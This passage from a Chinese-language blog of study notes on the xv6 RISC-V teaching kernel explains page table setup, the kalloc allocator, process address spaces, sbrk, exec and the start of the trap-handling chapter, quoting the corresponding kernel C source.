class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">memset</span>(pagetable, <span class="number">0</span>, PGSIZE);</span><br><span class="line">*pte = PA2PTE(pagetable) | PTE_V;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> &amp;pagetable[PX(<span class="number">0</span>, va)];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>kvninit</code>结束后，<code>main</code>调用<code>kvminithart</code>来安装内核页表。它将根页表页的物理地址写入寄存器<code>satp</code>。之后，CPU将使用内核页表转换地址。由于内核使用标识映射，下一条指令的当前虚拟地址将映射到正确的物理内存地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Switch h/w page table register to the kernel&#x27;s page table,</span></span><br><span class="line"><span class="comment">// and enable paging.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kvminithart</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">w_satp(MAKE_SATP(kernel_pagetable));</span><br><span class="line">sfence_vma();<span class="comment">// flush the TLB.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后<code>main</code>调用<code>procinit</code>，为每个进程分配一个内核栈，它将每个栈映射到<code>KSTACK</code>生成的虚拟地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// initialize the proc table at boot time.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">procinit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line">initlock(&amp;pid_lock, <span class="string">&quot;nextpid&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (p = proc; p &lt; &amp;proc[NPROC]; p++)</span><br><span class="line">&#123;</span><br><span class="line">initlock(&amp;p-&gt;lock, <span class="string">&quot;proc&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate a page for the process&#x27;s kernel stack.</span></span><br><span class="line"><span class="comment">// Map it high in memory, followed by an invalid</span></span><br><span class="line"><span class="comment">// guard page.</span></span><br><span class="line"><span class="keyword">char</span> *pa = kalloc();</span><br><span class="line"><span class="keyword">if</span> (pa == <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;kalloc&quot;</span>);</span><br><span class="line">uint64 va = KSTACK((<span class="keyword">int</span>)(p - proc));</span><br><span class="line">kvmmap(va, (uint64)pa, PGSIZE, PTE_R | PTE_W);</span><br><span class="line">p-&gt;kstack = va;</span><br><span class="line">&#125;</span><br><span class="line">kvminithart();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每个RISC-V CPU都将页表条目缓存在转译后备缓冲器（快表/TLB）中，RISC-V有一个指令<code>sfence.vma</code>，用于刷新当前CPU的TLB</p><h2 id="物理内存分配">3.4 物理内存分配</h2><p><code>kalloc</code>代码位于<code>kernelkalloc.c</code>，<code>kalloc</code>的数据结构是可供分配的物理内存页的空闲列表，空闲列表受到自旋锁（spin lock）的保护</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Allocate one 4096-byte page of physical memory.</span></span><br><span class="line"><span class="comment">// Returns a pointer that the kernel can use.</span></span><br><span class="line"><span class="comment">// Returns 0 if the memory cannot be allocated.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">kalloc</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">acquire(&amp;kmem.lock);</span><br><span class="line">r = kmem.freelist;</span><br><span class="line"><span class="keyword">if</span> (r)</span><br><span class="line">kmem.freelist = r-&gt;next;</span><br><span class="line">release(&amp;kmem.lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (r)</span><br><span class="line"><span class="built_in">memset</span>((<span class="keyword">char</span> *)r, <span class="number">5</span>, PGSIZE); <span class="comment">// fill with junk</span></span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">void</span> *)r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>main</code>调用<code>kinit</code>来初始化分配器，<code>kinit</code>初始化空闲列表以保存从内核结束到<code>PHYSTOP</code>之间的每一页。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kinit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">initlock(&amp;kmem.lock, <span class="string">&quot;kmem&quot;</span>);</span><br><span class="line">freerange(end, (<span class="keyword">void</span> *)PHYSTOP);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freerange</span><span class="params">(<span class="keyword">void</span> *pa_start, <span class="keyword">void</span> *pa_end)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *p;</span><br><span class="line">p = (<span class="keyword">char</span> *)PGROUNDUP((uint64)pa_start);</span><br><span class="line"><span class="keyword">for</span> (; p + PGSIZE &lt;= (<span class="keyword">char</span> *)pa_end; p += PGSIZE)</span><br><span class="line">kfree(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Free the page of physical memory pointed at by v,</span></span><br><span class="line"><span class="comment">// which normally should have been returned by a</span></span><br><span class="line"><span class="comment">// call to kalloc().  (The exception is when</span></span><br><span class="line"><span class="comment">// initializing the allocator; see kinit above.)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kfree</span><span class="params">(<span class="keyword">void</span> *pa)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (((uint64)pa % PGSIZE) != <span class="number">0</span> || (<span class="keyword">char</span> *)pa &lt; end || (uint64)pa &gt;= PHYSTOP)</span><br><span class="line">panic(<span class="string">&quot;kfree&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Fill with junk to catch dangling refs.</span></span><br><span class="line"><span class="built_in">memset</span>(pa, <span class="number">1</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line">r = (struct run *)pa;</span><br><span class="line"></span><br><span class="line">acquire(&amp;kmem.lock);</span><br><span class="line">r-&gt;next = kmem.freelist;</span><br><span class="line">kmem.freelist = r;</span><br><span class="line">release(&amp;kmem.lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="进程地址空间">3.5 进程地址空间</h2><p>每个进程都有一个单独的页表，当xv6在进程之间切换时，也会更改页表。一个进程的用户内存从虚拟地址零开始，可以增长到MAXVA，原则上允许一个进程内存寻址空间为256G。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// one beyond the highest possible virtual address.</span></span><br><span class="line"><span class="comment">// MAXVA is actually one bit less than the max allowed by</span></span><br><span class="line"><span class="comment">// Sv39, to avoid having to sign-extend virtual addresses</span></span><br><span class="line"><span class="comment">// that have the high bit set.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXVA (1L &lt;&lt; (9 + 9 + 9 + 12 - 1))</span></span><br></pre></td></tr></table></figure><p><img src="/2022/07/12/XV6/image-20220713121236349.png"></p><p>当进程向xv6请求更多的用户内存时，首先使用<code>kalloc</code>来分配物理页面。</p><p>内核在用户地址空间的顶部映射一个带有蹦床（trampoline）代码的页面，这样在所有地址空间都可以看到一个单独的物理内存页面。</p><p>为了检测用户栈是否溢出了所分配栈内存，xv6在栈正下方放置了一个无效的保护页（guard page）。如果用户栈溢出并且进程试图使用栈下方的地址，那么由于映射无效（<code>PTE_V</code>为0）硬件将生成一个页面故障异常。</p><h2 id="sbrk">3.6 sbrk</h2><p><code>sbrk</code>是一个用于进程减少或增长其内存的系统调用。其实是调用<code>growproc</code>实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint64</span></span><br><span class="line"><span class="function"><span class="title">sys_sbrk</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> addr;</span><br><span class="line">  <span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(argint(<span class="number">0</span>, &amp;n) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  addr = myproc()-&gt;sz;</span><br><span class="line">  <span class="keyword">if</span>(growproc(n) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>growproc</code>根据<code>n</code>是正的还是负的调用<code>uvmalloc</code>或<code>uvmdealloc</code>。<code>uvmalloc</code>用<code>kalloc</code>分配物理内存，并用<code>mappages</code>将PTE添加到用户页表中；<code>uvmdealloc</code>调用<code>uvmunmap</code>，<code>uvmunmap</code>使用<code>walk</code>来查找对应的PTE，并使用<code>kfree</code>来释放PTE引用的物理内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Grow or shrink user memory by n bytes.</span></span><br><span class="line"><span class="comment">// Return 0 on success, -1 on failure.</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">growproc</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">uint sz;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">sz = p-&gt;sz;</span><br><span class="line"><span class="keyword">if</span> (n &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ((sz = uvmalloc(p-&gt;pagetable, sz, sz + n)) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">sz = uvmdealloc(p-&gt;pagetable, sz, sz + n);</span><br><span class="line">&#125;</span><br><span class="line">p-&gt;sz = sz;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="exec">3.7 exec</h2><p>代码在<code>kernel/exec.c</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">exec</span><span class="params">(<span class="keyword">char</span> *path, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *s, *last;</span><br><span class="line"><span class="keyword">int</span> i, off;</span><br><span class="line">uint64 argc, sz = <span class="number">0</span>, sp, ustack[MAXARG + <span class="number">1</span>], stackbase;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">elfhdr</span> <span class="title">elf</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">ip</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proghdr</span> <span class="title">ph</span>;</span></span><br><span class="line"><span class="keyword">pagetable_t</span> pagetable = <span class="number">0</span>, oldpagetable;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">begin_op();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((ip = namei(path)) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">end_op();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">ilock(ip);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check ELF header</span></span><br><span class="line"><span class="keyword">if</span> (readi(ip, <span class="number">0</span>, (uint64)&amp;elf, <span class="number">0</span>, <span class="keyword">sizeof</span>(elf)) != <span class="keyword">sizeof</span>(elf))</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line"><span class="keyword">if</span> (elf.magic != ELF_MAGIC)</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((pagetable = proc_pagetable(p)) == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Load program into memory.</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>, off = elf.phoff; i &lt; elf.phnum; i++, off += <span class="keyword">sizeof</span>(ph))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (readi(ip, <span class="number">0</span>, (uint64)&amp;ph, off, <span class="keyword">sizeof</span>(ph)) != <span class="keyword">sizeof</span>(ph))</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line"><span class="keyword">if</span> (ph.type != ELF_PROG_LOAD)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (ph.memsz &lt; ph.filesz)</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line"><span class="keyword">if</span> (ph.vaddr + ph.memsz &lt; ph.vaddr)</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line">uint64 sz1;</span><br><span class="line"><span class="keyword">if</span> ((sz1 = uvmalloc(pagetable, sz, ph.vaddr + ph.memsz)) == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line">sz = sz1;</span><br><span class="line"><span class="keyword">if</span> (ph.vaddr % PGSIZE != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line"><span class="keyword">if</span> (loadseg(pagetable, ph.vaddr, ip, ph.off, ph.filesz) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line">&#125;</span><br><span class="line">iunlockput(ip);</span><br><span class="line">end_op();</span><br><span class="line">ip = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">p = myproc();</span><br><span class="line">uint64 oldsz = p-&gt;sz;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate two pages at the next page boundary.</span></span><br><span class="line"><span class="comment">// Use the second as the user stack.</span></span><br><span class="line">sz = PGROUNDUP(sz);</span><br><span class="line">uint64 sz1;</span><br><span class="line"><span class="keyword">if</span> ((sz1 = uvmalloc(pagetable, sz, sz + <span class="number">2</span> * PGSIZE)) == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line">sz = sz1;</span><br><span class="line">uvmclear(pagetable, sz - <span class="number">2</span> * PGSIZE);</span><br><span class="line">sp = sz;</span><br><span class="line">stackbase = sp - PGSIZE;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Push argument strings, prepare rest of stack in ustack.</span></span><br><span class="line"><span class="keyword">for</span> (argc = <span class="number">0</span>; argv[argc]; argc++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (argc &gt;= MAXARG)</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line">sp -= <span class="built_in">strlen</span>(argv[argc]) + <span class="number">1</span>;</span><br><span class="line">sp -= sp % <span class="number">16</span>; <span class="comment">// riscv sp must be 16-byte aligned</span></span><br><span class="line"><span class="keyword">if</span> (sp &lt; stackbase)</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line"><span class="keyword">if</span> (copyout(pagetable, sp, argv[argc], <span class="built_in">strlen</span>(argv[argc]) + <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line">ustack[argc] = sp;</span><br><span class="line">&#125;</span><br><span class="line">ustack[argc] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// push the array of argv[] pointers.</span></span><br><span class="line">sp -= (argc + <span class="number">1</span>) * <span class="keyword">sizeof</span>(uint64);</span><br><span class="line">sp -= sp % <span class="number">16</span>;</span><br><span class="line"><span class="keyword">if</span> (sp &lt; stackbase)</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line"><span class="keyword">if</span> (copyout(pagetable, sp, (<span class="keyword">char</span> *)ustack, (argc + <span class="number">1</span>) * <span class="keyword">sizeof</span>(uint64)) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line"></span><br><span class="line"><span class="comment">// arguments to user main(argc, argv)</span></span><br><span class="line"><span class="comment">// argc is returned via the system call return</span></span><br><span class="line"><span class="comment">// value, which goes in a0.</span></span><br><span class="line">p-&gt;trapframe-&gt;a1 = sp;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Save program name for debugging.</span></span><br><span class="line"><span class="keyword">for</span> (last = s = path; *s; s++)</span><br><span class="line"><span class="keyword">if</span> (*s == <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">last = s + <span class="number">1</span>;</span><br><span class="line">safestrcpy(p-&gt;name, last, <span class="keyword">sizeof</span>(p-&gt;name));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Commit to the user image.</span></span><br><span class="line">oldpagetable = p-&gt;pagetable;</span><br><span class="line">p-&gt;pagetable = pagetable;</span><br><span class="line">p-&gt;sz = sz;</span><br><span class="line">p-&gt;trapframe-&gt;epc = elf.entry; <span class="comment">// initial program counter = main</span></span><br><span class="line">p-&gt;trapframe-&gt;sp = sp;   <span class="comment">// initial stack pointer</span></span><br><span class="line">proc_freepagetable(oldpagetable, oldsz);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> argc; <span class="comment">// this ends up in a0, the first argument to main(argc, argv)</span></span><br><span class="line"></span><br><span class="line">bad:</span><br><span class="line"><span class="keyword">if</span> (pagetable)</span><br><span class="line">proc_freepagetable(pagetable, sz);</span><br><span class="line"><span class="keyword">if</span> (ip)</span><br><span class="line">&#123;</span><br><span class="line">iunlockput(ip);</span><br><span class="line">end_op();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先使用<code>namei</code>打开指定二进制path，之后读ELF的文件头，检查magic。</p><p>之后使用<code>proc_pagetable</code>分配一个没有用户映射的新页表，使用<code>uvmalloc</code> 为每个ELF段分配内存，并使用<code>loadseg</code> 将每个段加载到内存中。<code>loadseg</code>使用<code>walkaddr</code>找到分配内存的物理地址，在该地址写入ELF段的每一页，并使用<code>readi</code>从文件中读取。</p><p>现在<code>exec</code>分配并初始化用户栈。它只分配一个栈页面。<code>exec</code>一次将参数中的一个字符串复制到栈顶，并在<code>ustack</code>中记录指向它们的指针。它在传递给<code>main</code>的<code>argv</code>列表的末尾放置一个空指针。<code>ustack</code>中的前三个条目是伪返回程序计数器（fake return program counter）、<code>argc</code>和<code>argv</code>指针。</p><p><code>exec</code>在栈页面的正下方放置了一个不可访问的页面，这样试图使用超过一个页面的程序就会出错。</p><p>在准备新内存映像的过程中，如果<code>exec</code>检测到像无效程序段这样的错误，它会跳到标签<code>bad</code>，释放新映像，并返回-1。<code>exec</code>必须等待系统调用会成功后再释放旧映像：因为如果旧映像消失了，系统调用将无法返回-1。<code>exec</code>中唯一的错误情况发生在映像的创建过程中。一旦映像完成，<code>exec</code>就可以提交到新的页表(上述代码104行)并释放旧的页表(上述代码108行)。</p><h2 id="real-world">3.8 Real world</h2><p>RISC-V支持物理地址级别的保护，但xv6没有使用这个特性。</p><p>xv6内核缺少一个类似<code>malloc</code>可以为小对象提供内存的分配器，这使得内核无法使用需要动态分配的复杂数据结构。</p><h1 id="chapter-4traps-and-system-calls">Chapter 4:Traps and system calls</h1><p>有三种事件会导致中央处理器搁置普通指令的执行，并强制将控制权转移到处理该事件的特殊代码上：陷阱（trap）</p><ol type="1"><li>系统调用：当用户程序执行<code>ecall</code>指令要求内核为其做些什么时</li><li>异常：（用户或内核）指令做了一些非法的事情，例如除以零或使用无效的虚拟地址</li><li>设备中断：例如当磁盘硬件完成读或写请求时，向系统表明它需要被关注</li></ol><p>通常，陷阱发生时正在执行的任何代码都需要稍后恢复。</p><p>通常的顺序是陷阱强制将控制权转移到内核；内核保存寄存器和其他状态，以便可以恢复执行；内核执行适当的处理程序代码（例如，系统调用接口或设备驱动程序）；内核恢复保存的状态并从陷阱中返回；原始代码从它停止的地方恢复。</p><h2 id="risc-v陷入机制">4.1 RISC-V陷入机制</h2><p>每个RISC-V CPU都有一组控制寄存器，内核通过向这些寄存器写入内容来告诉CPU如何处理陷阱，内核可以读取这些寄存器来明确已经发生的陷阱。</p><p>一些重要的寄存器介绍：</p><ul><li><code>stvec</code>：内核在这里写入其陷阱处理程序的地址；RISC-V跳转到这里处理陷阱。</li><li><code>sepc</code>：当发生陷阱时，RISC-V会在这里保存程序计数器<code>pc</code>（因为<code>pc</code>会被<code>stvec</code>覆盖）。<code>sret</code>（从陷阱返回）指令会将<code>sepc</code>复制到<code>pc</code>。内核可以写入<code>sepc</code>来控制<code>sret</code>的去向。</li><li><code>scause</code>： RISC-V在这里放置一个描述陷阱原因的数字。</li><li><code>sscratch</code>：内核在这里放置了一个值，这个值在陷阱处理程序一开始就会派上用场。</li><li><code>sstatus</code>：其中的<strong>SIE</strong>位控制设备中断是否启用。如果内核清空<strong>SIE</strong>，RISC-V将推迟设备中断，直到内核重新设置<strong>SIE</strong>。<strong>SPP</strong>位指示陷阱是来自用户模式还是管理模式，并控制<code>sret</code>返回的模式。</li></ul><p>上述寄存器在用户模式下不能读取和写入。</p><p>当需要强制执行陷阱时，RISC-V硬件对所有陷阱类型（计时器中断除外）执行以下操作：</p><ol type="1"><li>如果陷阱是设备中断，并且状态<strong>SIE</strong>位被清空，则不执行以下任何操作。</li><li>清除<strong>SIE</strong>以禁用中断。</li><li>将<code>pc</code>复制到<code>sepc</code>。</li><li>将当前模式（用户或管理）保存在状态的<strong>SPP</strong>位中。</li><li>设置<code>scause</code>以反映产生陷阱的原因。</li><li>将模式设置为管理模式。</li><li>将<code>stvec</code>复制到<code>pc</code>。</li><li>在新的<code>pc</code>上开始执行。</li></ol><blockquote><p><strong>CPU不会切换到内核页表，不会切换到内核栈，也不会保存除<code>pc</code>之外的任何寄存器。</strong></p></blockquote><h2 id="从用户空间陷入">4.2 从用户空间陷入</h2><blockquote><p>来自用户空间的陷阱的高级路径是<code>uservec</code> (<strong>kernel/trampoline.S</strong>)，然后是<code>usertrap</code> (<strong>kernel/trap.c</strong>)；返回时，先是<code>usertrapret</code> (<strong>kernel/trap.c</strong>)，然后是<code>userret</code> (<strong>kernel/trampoline.S</strong>)。</p><p>由于RISC-V硬件在陷阱期间不会切换页表，所以用户页表必须包括<code>uservec</code>（<strong>stvec</strong>指向的陷阱向量指令）的映射。<code>uservec</code>必须切换<code>satp</code>以指向内核页表；为了在切换后继续执行指令，<code>uservec</code>必须在内核页表中与用户页表中映射相同的地址。</p><p>xv6使用包含<code>uservec</code>的蹦床页面（trampoline page）来满足这些约束。xv6将蹦床页面映射到内核页表和每个用户页表中相同的虚拟地址。这个虚拟地址是<code>TRAMPOLINE</code>。蹦床内容在<strong>trampoline.S</strong>中设置，并且（当执行用户代码时）<code>stvec</code>设置为<code>uservec</code> 。</p></blockquote><blockquote><p>http://xv6.dgs.zone/tranlate_books/book-riscv-rev1/c4/s2.html</p></blockquote><p>陷入：</p><p><code>uservec</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 